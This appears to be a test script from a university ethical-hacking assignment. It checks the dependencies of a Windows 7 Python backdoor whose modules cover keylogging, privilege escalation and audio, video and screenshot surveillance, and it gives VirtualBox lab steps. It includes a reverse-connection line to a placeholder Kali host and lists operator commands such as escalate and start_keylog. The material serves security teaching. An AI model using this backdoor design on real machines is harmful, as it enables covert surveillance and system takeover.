#!/usr/bin/env python3
################################################
# Enhanced Backdoor Test Script                #
# Author: Enhanced Backdoor Assignment         #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

import sys
import os

def test_dependencies():
    """Test all required dependencies for Windows 7 backdoor"""
    print("=" * 60)
    print("Testing dependencies for Windows 7 backdoor...")
    print("=" * 60)
    
    dependencies = [
        ('socket', 'Network communication'),
        ('json', 'JSON handling'),
        ('subprocess', 'Process execution'),
        ('threading', 'Multi-threading'),
        ('os', 'Operating system interface'),
        ('time', 'Time functions'),
        ('datetime', 'Date/time handling')
    ]
    
    # Windows-specific libraries
    windows_deps = [
        ('win32api', 'Windows API access'),
        ('win32gui', 'Windows GUI functions'),
        ('winreg', 'Windows registry access'),
        ('win32security', 'Windows security functions'),
        ('win32service', 'Windows service management'),
    ]
    
    # Optional enhanced features
    enhanced_deps = [
        ('pynput.keyboard', 'Cross-platform keylogger'),
        ('PIL.ImageGrab', 'Screenshot capture'),
        ('pyautogui', 'Screen automation'),
        ('cv2', 'Video recording'),
        ('numpy', 'Array processing'),
        ('psutil', 'System information'),
    ]
    
    # Try pyHook (Windows-specific)
    try:
        import pyHook
        enhanced_deps.append(('pyHook', 'Windows keyboard hooks'))
    except ImportError:
        print("⚠️  Warning: pyHook not available - using pynput fallback")
    
    # Try PyAudio
    try:
        import pyaudio
        enhanced_deps.append(('pyaudio', 'Audio recording'))
    except ImportError:
        print("⚠️  Warning: PyAudio not available - audio recording disabled")
    
    success_count = 0
    failed_imports = []
    
    # Test basic dependencies
    print("\\nBasic Dependencies:")
    print("-" * 40)
    for module_name, description in dependencies:
        try:
            __import__(module_name)
            print(f"✅ {module_name:<20} - {description}")
            success_count += 1
        except ImportError as e:
            print(f"❌ {module_name:<20} - {description} - FAILED: {str(e)}")
            failed_imports.append(module_name)
    
    # Test Windows dependencies
    print("\\nWindows Dependencies:")
    print("-" * 40)
    for module_name, description in windows_deps:
        try:
            __import__(module_name)
            print(f"✅ {module_name:<20} - {description}")
            success_count += 1
        except ImportError as e:
            print(f"❌ {module_name:<20} - {description} - FAILED: {str(e)}")
            failed_imports.append(module_name)
    
    # Test enhanced dependencies
    print("\\nEnhanced Features:")
    print("-" * 40)
    for module_name, description in enhanced_deps:
        try:
            __import__(module_name)
            print(f"✅ {module_name:<20} - {description}")
            success_count += 1
        except ImportError as e:
            print(f"⚠️  {module_name:<20} - {description} - OPTIONAL: {str(e)}")
    
    total_deps = len(dependencies) + len(windows_deps)
    
    print("\\n" + "=" * 60)
    print(f"Results: {success_count}/{total_deps} critical dependencies available")
    
    if failed_imports:
        print(f"\\n❌ Failed imports: {', '.join(failed_imports)}")
        print("\\n📦 To install missing dependencies:")
        print("pip install -r requirements.txt")
        print("\\n📋 For Windows 7 specific issues:")
        print("1. Install Visual C++ Build Tools if pyHook/PyAudio fail")
        print("2. Download pyHook wheel from: https://www.lfd.uci.edu/~gohlke/pythonlibs/")
        print("3. Use: pip install <downloaded_wheel_file>")
        return False
    else:
        print("\\n✅ All critical dependencies available! Ready for assignment.")
        return True


def test_modules():
    """Test individual backdoor modules"""
    print("\\n" + "=" * 60)
    print("Testing backdoor modules...")
    print("=" * 60)
    
    modules_to_test = [
        ('keylogger', 'Keylogger functionality'),
        ('privilege', 'Privilege escalation'),
        ('recording', 'Audio/Video recording'),
    ]
    
    for module_name, description in modules_to_test:
        try:
            module = __import__(module_name)
            print(f"✅ {module_name:<15} - {description} - Loaded successfully")
            
            # Test specific functionality
            if module_name == 'keylogger':
                try:
                    keylogger = module.create_keylogger("test_keylog.txt")
                    print(f"   └── Keylogger instance created successfully")
                except Exception as e:
                    print(f"   └── ⚠️  Keylogger creation warning: {str(e)}")
            
            elif module_name == 'privilege':
                try:
                    escalator = module.Windows7PrivilegeEscalator("test_privesc.log")
                    print(f"   └── Privilege escalator created successfully")
                    print(f"   └── Current privileges: {escalator.current_privileges}")
                except Exception as e:
                    print(f"   └── ⚠️  Privilege escalator warning: {str(e)}")
            
            elif module_name == 'recording':
                try:
                    recorder = module.create_surveillance_recorder("test_recordings")
                    print(f"   └── Surveillance recorder created successfully")
                    status = recorder.get_system_status()
                    print(f"   └── Audio available: {status['audio_available']}")
                    print(f"   └── Video available: {status['video_available']}")
                    print(f"   └── Screenshot available: {status['screenshot_available']}")
                except Exception as e:
                    print(f"   └── ⚠️  Surveillance recorder warning: {str(e)}")
                    
        except ImportError as e:
            print(f"❌ {module_name:<15} - {description} - FAILED: {str(e)}")
        except Exception as e:
            print(f"⚠️  {module_name:<15} - {description} - ERROR: {str(e)}")


def show_network_config():
    """Show network configuration instructions"""
    print("\\n" + "=" * 60)
    print("Network Configuration Instructions")
    print("=" * 60)
    
    print("\\n🔧 VirtualBox Setup:")
    print("1. Create NAT Network or Host-Only Network")
    print("2. Configure both VMs to use the same network")
    print("3. Find IP addresses:")
    print("   - Windows 7: ipconfig")
    print("   - Kali Linux: ip addr show")
    
    print("\\n📝 Code Updates Needed:")
    print("1. Update backdoor.py line 34:")
    print("   s.connect(('YOUR_KALI_IP', 5555))")
    print("\\n2. Server.py already configured to listen on all interfaces")
    
    print("\\n🚀 Testing Order:")
    print("1. Start server.py on Kali Linux")
    print("2. Start backdoor.py on Windows 7")
    print("3. Test basic commands: whoami, dir, ipconfig")
    print("4. Test enhanced features:")
    print("   - start_keylog, get_keylog, stop_keylog")
    print("   - screenshot, start_recording, stop_recording") 
    print("   - check_privs, escalate, privesc_report")


def main():
    """Main test function"""
    print("🎯 Enhanced Python Backdoor - System Test")
    print("Windows 7 Assignment - SIIT Ethical Hacking")
    print("=" * 60)
    
    # Test dependencies
    deps_ok = test_dependencies()
    
    if deps_ok:
        # Test modules
        test_modules()
    
    # Show network configuration
    show_network_config()
    
    print("\\n" + "=" * 60)
    if deps_ok:
        print("✅ System ready for testing!")
        print("\\n📋 Next steps:")
        print("1. Configure network settings in VirtualBox")
        print("2. Update IP addresses in backdoor.py")
        print("3. Start server.py on Kali")
        print("4. Start backdoor.py on Windows 7")
        print("5. Test all enhanced features")
    else:
        print("❌ Please install missing dependencies first:")
        print("pip install -r requirements.txt")
    
    print("\\n🚨 Remember: Use only in authorized environments!")
    print("=" * 60)


if __name__ == "__main__":
    main()
